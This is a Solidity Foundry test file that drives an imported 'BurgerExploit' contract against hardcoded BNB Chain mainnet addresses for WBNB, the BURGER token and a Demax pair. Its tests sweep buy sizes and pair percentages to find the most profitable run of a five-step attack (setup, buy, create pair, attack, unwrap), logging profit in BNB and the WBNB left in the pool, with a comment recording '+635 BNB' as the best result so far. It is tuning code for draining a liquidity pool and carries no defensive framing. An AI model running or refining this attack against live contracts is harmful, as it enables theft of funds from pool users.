// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest8 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    // Best config from previous: buy=5000, pct=10 -> +635 BNB
    // Let's test 5000 with pct=10,12,15
    function test_5000_10() public {
        _run(5000 ether, 10);
    }

    function test_5000_15() public {
        _run(5000 ether, 15);
    }

    function test_5000_20() public {
        _run(5000 ether, 20);
    }

    function test_10000_5() public {
        _run(10000 ether, 5);
    }

    function test_10000_8() public {
        _run(10000 ether, 8);
    }

    function test_10000_10() public {
        _run(10000 ether, 10);
    }

    function test_20000_5() public {
        _run(20000 ether, 5);
    }

    function test_50000_3() public {
        _run(50000 ether, 3);
    }

    function _run(uint256 buyAmount, uint256 pairPct) internal {
        address att = makeAddr("att");
        uint256 startBnb = buyAmount + 500 ether;
        vm.deal(att, startBnb);
        vm.startPrank(att);

        BurgerExploit e = new BurgerExploit();
        e.step1_setup{value: buyAmount + 200 ether}();
        e.step2_buyBurger(buyAmount);

        uint256 bBal = IERC20(BURGER).balanceOf(address(e));
        uint256 forPair = bBal * pairPct / 100;

        e.step3_createPair(100 ether, forPair);
        e.step4_attack(50 ether);
        e.step5_unwrap();

        int256 profit = int256(att.balance) - int256(startBnb);
        string memory pSign = profit >= 0 ? "+" : "-";
        uint256 absProfit = profit >= 0 ? uint256(profit) : uint256(-profit);
        emit log_string(string.concat(
            "buy=", vm.toString(buyAmount / 1 ether),
            " pct=", vm.toString(pairPct),
            " profit=", pSign, vm.toString(absProfit / 1 ether), " BNB"
        ));

        // Also log the BURGER/WBNB pool state after attack
        address pair = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;
        (uint112 r0, uint112 r1,) = IDemaxPair(pair).getReserves();
        emit log_named_uint("WBNB remaining in pool", r1);

        vm.stopPrank();
    }
}
